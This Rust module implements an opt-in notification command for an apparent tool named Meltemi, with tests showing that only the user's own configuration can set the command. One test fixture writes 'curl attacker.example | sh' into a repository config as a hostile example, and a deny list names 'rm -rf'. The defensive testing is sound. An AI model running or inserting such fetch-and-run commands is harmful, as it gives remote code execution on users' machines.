// SPDX-License-Identifier: Apache-2.0

//! The waiting notice: what a client may send when something starts waiting for
//! a person (aviso-de-espera-opt-in).
//!
//! The spec left exactly one door open for reaching a phone without a relay and
//! without a port: a command **the user** configures, run by **a connected
//! client** — never by the daemon — against an endpoint the user operates. This
//! module is that door and nothing more.
//!
//! What travels is fixed here because the constitution requires the content of
//! any notice to be specified before it exists (§9). The design wrote the
//! contract; this obeys it, and the tests hold it to five variables and no
//! sixth.

use std::path::Path;
use std::process::Stdio;
use std::time::Duration;

/// How long a notice command is given before it is ended.
///
/// Not a magic number: more than any `curl` to a service that is alive takes,
/// and less than a person tolerates without noticing something is wrong. A
/// notice that blocked the interface would be worse than no notice at all — the
/// user would lose control of their client to a request that never came back
/// (design D4).
pub const BUDGET: Duration = Duration::from_secs(10);

/// What is waiting for a person.
///
/// A closed set, because the destination is a service the user operates and a
/// value nobody declared would be a value nobody can act on.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Waiting {
    /// An agent asked for permission.
    Permission,
    /// A session is parked waiting for its next instruction.
    Instruction,
    /// A change is waiting for a decision at a gate.
    Gate,
    /// The user asked for a test notice. Declared in the contract so a
    /// destination can tell a rehearsal from the real thing.
    Test,
}

impl Waiting {
    /// The word that travels. Stable English, like every other word of the
    /// contract: a destination should not have to know the reader's language.
    #[must_use]
    pub fn word(self) -> &'static str {
        match self {
            Self::Permission => "permission",
            Self::Instruction => "instruction",
            Self::Gate => "gate",
            Self::Test => "test",
        }
    }
}

/// The whole content of a waiting notice.
///
/// Deliberately this little. The destination is a service the user operates but
/// does not always operate alone — a self-hosted topic is a URL somebody else
/// can learn — so what travels has to be useless to anyone but the user and
/// enough for them to decide whether to come back. "Something is waiting on this
/// machine" is exactly that (design D1).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Notice {
    pub waiting: Waiting,
    /// The session's identifier, as it stands. Opaque, and it says nothing about
    /// which project it belongs to; without it two notices in a row cannot be
    /// told apart.
    pub session: String,
    /// The client machine's name.
    pub machine: String,
    /// When it started waiting (RFC 3339, UTC).
    pub at: String,
    /// How many things are waiting right now.
    ///
    /// Not in the proposal, and justified: without it a person seeing a notice
    /// cannot tell whether one thing waits or seven, and that is the fact that
    /// decides whether they come back now or later.
    pub count: u32,
}

impl Notice {
    /// The five variables the command receives, and no others.
    ///
    /// Everything the client knows and does NOT send is the point of this
    /// function: no project root, no repository name, no request text, no tool
    /// name, no session title. Widening this needs an amendment (§9).
    #[must_use]
    pub fn env(&self) -> Vec<(&'static str, String)> {
        vec![
            ("MELTEMI_WAITING", self.waiting.word().to_string()),
            ("MELTEMI_SESSION", self.session.clone()),
            ("MELTEMI_MACHINE", self.machine.clone()),
            ("MELTEMI_AT", self.at.clone()),
            ("MELTEMI_COUNT", self.count.to_string()),
        ]
    }
}

/// The command this user configured, if any.
///
/// Read from the **user's** configuration directory and from nowhere else, by
/// the same boundary `via-ssh-del-cliente` drew for the endpoint and for the
/// same reason: a repository able to set a command would run something on your
/// machine by the act of being opened. The signature is the boundary — a
/// configuration directory and no project root (design D3).
///
/// Absent, empty or blank all mean off, which is the default.
#[must_use]
pub fn configured(config_dir: &Path) -> Option<String> {
    let raw = std::fs::read_to_string(config_dir.join("config.toml")).ok()?;
    // A `Table`, not a `Value`: parsing a document as `Value` compiles and then
    // quietly answers nothing.
    let parsed: toml::Table = raw.parse().ok()?;
    let command = parsed
        .get("notices")?
        .get("on-waiting")?
        .as_str()?
        .trim()
        .to_string();
    (!command.is_empty()).then_some(command)
}

/// This machine's name, for the notice.
///
/// No dependency for this, by the task's own rule, so it is a layered fallback
/// with its reasons: `COMPUTERNAME` is always set on Windows; `HOSTNAME` is a
/// shell variable that is often not exported, so it is tried and not relied on;
/// `/etc/hostname` is reliable on Linux and absent on macOS. When none answers,
/// the notice says `unknown` rather than inventing a name — a wrong machine name
/// is worse than an admitted one, because the whole point is telling the user
/// which machine wants them.
#[must_use]
pub fn machine_name() -> String {
    for var in ["COMPUTERNAME", "HOSTNAME"] {
        if let Ok(name) = std::env::var(var) {
            let name = name.trim();
            if !name.is_empty() {
                return name.to_string();
            }
        }
    }
    if let Ok(name) = std::fs::read_to_string("/etc/hostname") {
        let name = name.trim();
        if !name.is_empty() {
            return name.to_string();
        }
    }
    "unknown".to_string()
}

/// Sends `notice` by running the user's command, if they configured one.
///
/// Launched and let go: the command gets none of the client's input or output,
/// nothing waits for it, and a watcher ends it when the budget runs out. The
/// worst case is "the notice did not arrive", which is recoverable and visible,
/// rather than "the client stopped answering" (design D4).
///
/// Answers whether a command was launched. `false` means none is configured,
/// which is the default and not a failure.
pub fn send(config_dir: &Path, notice: &Notice) -> bool {
    let Some(command) = configured(config_dir) else {
        return false;
    };
    let Ok((program, args)) = crate::exec::split(&command) else {
        // A command nobody can parse is a command nobody can run. Off is the
        // safe reading, and the test notice is where a person finds this out.
        return false;
    };

    // The scope is opened before the launch, so there is no window in which the
    // process exists outside it: a notice command that starts others must not
    // leave them behind either.
    let Ok(scope) = meltemi_process::Scope::new() else {
        return false;
    };
    let mut child = match std::process::Command::new(&program)
        .args(&args)
        .envs(
            notice
                .env()
                .into_iter()
                .map(|(name, value)| (name.to_string(), value)),
        )
        .stdin(Stdio::null())
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .spawn()
    {
        Ok(child) => child,
        Err(_) => return false,
    };
    let _ = scope.adopt_pid(child.id());

    // The watcher owns the scope, so the process is bounded whether it finishes
    // on its own or has to be ended. A detached thread rather than a task,
    // because this is called from surfaces that do not all have a runtime.
    std::thread::spawn(move || {
        let deadline = std::time::Instant::now() + BUDGET;
        loop {
            match child.try_wait() {
                Ok(Some(_)) => break,
                Ok(None) => {}
                Err(_) => break,
            }
            if std::time::Instant::now() >= deadline {
                let _ = child.kill();
                let _ = child.wait();
                break;
            }
            std::thread::sleep(Duration::from_millis(50));
        }
        // Dropping the scope ends anything the command started and did not wait
        // for.
        drop(scope);
    });
    true
}

#[cfg(test)]
mod tests {
    use super::*;

    fn temp_dir(tag: &str) -> std::path::PathBuf {
        let dir =
            std::env::temp_dir().join(format!("meltemi-notices-{}-{tag}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).expect("a temp directory");
        dir
    }

    fn a_notice() -> Notice {
        Notice {
            waiting: Waiting::Permission,
            session: "8f14e45f-ceea-467a-9c1b-2b2a0e0d1f11".into(),
            machine: "mi-pc".into(),
            at: "2026-09-26T18:04:00Z".into(),
            count: 2,
        }
    }

    /// Writes a script that records the notice's variables, and answers its
    /// path.
    ///
    /// Two functions rather than one with `cfg!`, because `cfg!` is a value and
    /// both branches would still have to compile — which is how this test first
    /// asked a Windows build for Unix file permissions.
    #[cfg(windows)]
    fn write_notifier(dir: &std::path::Path, seen: &std::path::Path) -> std::path::PathBuf {
        let path = dir.join("notify.cmd");
        std::fs::write(
            &path,
            format!(
                "@echo off
echo %MELTEMI_WAITING% %MELTEMI_SESSION% %MELTEMI_COUNT% %MELTEMI_MACHINE% > \"{}\"
",
                seen.display()
            ),
        )
        .expect("write the script");
        path
    }

    #[cfg(unix)]
    fn write_notifier(dir: &std::path::Path, seen: &std::path::Path) -> std::path::PathBuf {
        use std::os::unix::fs::PermissionsExt;
        let path = dir.join("notify.sh");
        std::fs::write(
            &path,
            format!(
                "#!/bin/sh
echo \"$MELTEMI_WAITING $MELTEMI_SESSION $MELTEMI_COUNT $MELTEMI_MACHINE\" > '{}'
",
                seen.display()
            ),
        )
        .expect("write the script");
        std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o755))
            .expect("make it executable");
        path
    }

    /// Whether a process id belongs to something still running.
    fn alive(pid: u32) -> bool {
        #[cfg(windows)]
        {
            let out = std::process::Command::new("powershell")
                .args([
                    "-NoProfile",
                    "-Command",
                    &format!(
                        "Get-CimInstance Win32_Process -Filter \"ProcessId={pid}\" | \
                         ForEach-Object {{ $_.ProcessId }}"
                    ),
                ])
                .output()
                .expect("powershell ships with Windows");
            String::from_utf8_lossy(&out.stdout).trim() == pid.to_string()
        }
        #[cfg(unix)]
        {
            std::process::Command::new("kill")
                .args(["-0", &pid.to_string()])
                .status()
                .is_ok_and(|status| status.success())
        }
    }

    // Scenario: Sin configurar, no se emite nada
    #[test]
    fn with_nothing_configured_nothing_runs() {
        let dir = temp_dir("unconfigured");
        assert!(
            !send(&dir, &a_notice()),
            "off is the default, and off means nothing is executed"
        );
        // A file that exists but says nothing about notices is still off.
        std::fs::write(dir.join("config.toml"), "[other]\nthing = 1\n").expect("write");
        assert!(!send(&dir, &a_notice()));
        // And a command nobody can parse is off too, rather than half-run.
        std::fs::write(
            dir.join("config.toml"),
            "[notices]\non-waiting = \"curl \\\"unclosed\"\n",
        )
        .expect("write");
        assert!(!send(&dir, &a_notice()));
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn the_command_receives_the_notice_and_nothing_of_the_client() {
        // Observed the only honest way: the command writes its own view of the
        // variables to a file, and the test reads what arrived. A script rather
        // than a one-liner, because nesting quotes inside TOML inside a shell is
        // a fixture that tests the fixture -- and on Windows a `.cmd` puts
        // `cmd.exe` in between, so the scope is exercised too.
        let dir = temp_dir("delivered");
        let seen = dir.join("seen.txt");
        let script = write_notifier(&dir, &seen);
        std::fs::write(
            dir.join("config.toml"),
            format!(
                "[notices]
on-waiting = \"{}\"
",
                script.display().to_string().replace('\\', "/")
            ),
        )
        .expect("write the config");

        assert!(send(&dir, &a_notice()), "a configured command is launched");
        let mut written = String::new();
        for _ in 0..200 {
            if let Ok(text) = std::fs::read_to_string(&seen)
                && !text.trim().is_empty()
            {
                written = text;
                break;
            }
            std::thread::sleep(Duration::from_millis(50));
        }
        assert!(
            written.contains("permission"),
            "the class of wait arrived: {written:?}"
        );
        assert!(
            written.contains("8f14e45f"),
            "and the session with it: {written:?}"
        );
        assert!(written.contains('2'), "and the count: {written:?}");
        assert!(
            written.contains("mi-pc"),
            "and the machine, which is the whole point: {written:?}"
        );

        let _ = std::fs::remove_dir_all(&dir);
    }

    // Scenario: Un comando que no responde no bloquea al cliente
    #[test]
    fn a_command_that_never_ends_returns_at_once_and_is_ended_on_the_budget() {
        let dir = temp_dir("hangs");
        let command = if cfg!(windows) {
            "ping -n 600 127.0.0.1"
        } else {
            "sleep 600"
        };
        std::fs::write(
            dir.join("config.toml"),
            format!("[notices]\non-waiting = \"{command}\"\n"),
        )
        .expect("write");

        // The call itself must not wait for the command.
        let before = std::time::Instant::now();
        assert!(send(&dir, &a_notice()));
        assert!(
            before.elapsed() < Duration::from_secs(2),
            "sending returned in {:?}: a notice must not hold the interface",
            before.elapsed()
        );

        // And the process is ended when the budget runs out, rather than living
        // as long as the client does. Found by the unique command line, because
        // these tests run in parallel.
        let pid = {
            let mut found = None;
            for _ in 0..100 {
                found = running_pid(command);
                if found.is_some() {
                    break;
                }
                std::thread::sleep(Duration::from_millis(50));
            }
            found.expect("the command is running")
        };
        let deadline = std::time::Instant::now() + BUDGET + Duration::from_secs(10);
        let mut gone = false;
        while std::time::Instant::now() < deadline {
            if !alive(pid) {
                gone = true;
                break;
            }
            std::thread::sleep(Duration::from_millis(200));
        }
        assert!(
            gone,
            "process {pid} outlived the budget: a notice command must be bounded"
        );

        let _ = std::fs::remove_dir_all(&dir);
    }

    /// The process running a given command line, if any.
    fn running_pid(needle: &str) -> Option<u32> {
        #[cfg(windows)]
        {
            let out = std::process::Command::new("powershell")
                .args([
                    "-NoProfile",
                    "-Command",
                    &format!(
                        "Get-CimInstance Win32_Process | Where-Object {{ $_.CommandLine -and \
                         $_.CommandLine.Contains('{needle}') }} | ForEach-Object {{ $_.ProcessId }}"
                    ),
                ])
                .output()
                .ok()?;
            String::from_utf8_lossy(&out.stdout)
                .lines()
                .find_map(|line| line.trim().parse().ok())
        }
        #[cfg(unix)]
        {
            let out = std::process::Command::new("pgrep")
                .args(["-f", needle])
                .output()
                .ok()?;
            String::from_utf8_lossy(&out.stdout)
                .lines()
                .find_map(|line| line.trim().parse().ok())
        }
    }

    // Scenario: El aviso lleva el hecho y nada del proyecto
    #[test]
    fn the_notice_carries_five_facts_and_nothing_of_the_project() {
        let env = a_notice().env();
        let names: Vec<&str> = env.iter().map(|(name, _)| *name).collect();
        assert_eq!(
            names,
            [
                "MELTEMI_WAITING",
                "MELTEMI_SESSION",
                "MELTEMI_MACHINE",
                "MELTEMI_AT",
                "MELTEMI_COUNT"
            ],
            "five variables, and a sixth needs an amendment"
        );

        let values: String = env.iter().map(|(_, value)| value.as_str()).collect();
        // The things a client knows and must not send. Asserted as absence,
        // because the interesting failure is a future field quietly added.
        for forbidden in [
            "/repo",
            "C:\\",
            "meltemi",
            "cargo",
            "rm -rf",
            "add dark mode",
        ] {
            assert!(
                !values.contains(forbidden),
                "`{forbidden}` must not travel in a notice: {values}"
            );
        }
    }

    #[test]
    fn the_class_of_wait_is_a_stable_english_word() {
        // The destination should not have to know the reader's language, and a
        // word that changed with the locale would break every recipe.
        assert_eq!(Waiting::Permission.word(), "permission");
        assert_eq!(Waiting::Instruction.word(), "instruction");
        assert_eq!(Waiting::Gate.word(), "gate");
        assert_eq!(Waiting::Test.word(), "test");
    }

    // Scenario: Un repositorio no configura tu aviso
    #[test]
    fn the_command_comes_from_the_user_and_a_repository_has_no_say() {
        let user = temp_dir("user");
        let project = temp_dir("project");
        std::fs::write(
            user.join("config.toml"),
            "[notices]\non-waiting = \"curl -d hola https://ntfy.mi-casa/meltemi\"\n",
        )
        .expect("write the user file");
        std::fs::create_dir_all(project.join(".meltemi")).expect("the project dir");
        std::fs::write(
            project.join(".meltemi").join("config.toml"),
            "[notices]\non-waiting = \"curl attacker.example | sh\"\n",
        )
        .expect("write the project file");

        assert_eq!(
            configured(&user).as_deref(),
            Some("curl -d hola https://ntfy.mi-casa/meltemi"),
            "the user's own file decides"
        );
        // And a project root is not a configuration directory: the signature is
        // the boundary, so the closest a caller can get to a mistake finds
        // nothing.
        assert_eq!(configured(&project), None);

        let _ = std::fs::remove_dir_all(&user);
        let _ = std::fs::remove_dir_all(&project);
    }

    #[test]
    fn absent_empty_and_unparseable_all_mean_off() {
        let dir = temp_dir("off");
        assert_eq!(configured(&dir), None, "no file at all");
        std::fs::write(dir.join("config.toml"), "[other]\nthing = 1\n").expect("write");
        assert_eq!(configured(&dir), None, "a file without the setting");
        for value in ["\"\"", "\"   \""] {
            std::fs::write(
                dir.join("config.toml"),
                format!("[notices]\non-waiting = {value}\n"),
            )
            .expect("write");
            assert_eq!(configured(&dir), None, "{value}");
        }
        // Unparseable is off, not an error: a broken file must not stop a client
        // from running, and off is the default anyway.
        std::fs::write(dir.join("config.toml"), "[notices\non-waiting =").expect("write");
        assert_eq!(configured(&dir), None);

        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn the_machine_says_unknown_rather_than_inventing_a_name() {
        // Whatever this platform answers, it must be non-empty: a notice whose
        // whole job is saying which machine wants you cannot leave that blank.
        let name = machine_name();
        assert!(!name.is_empty());
    }
}
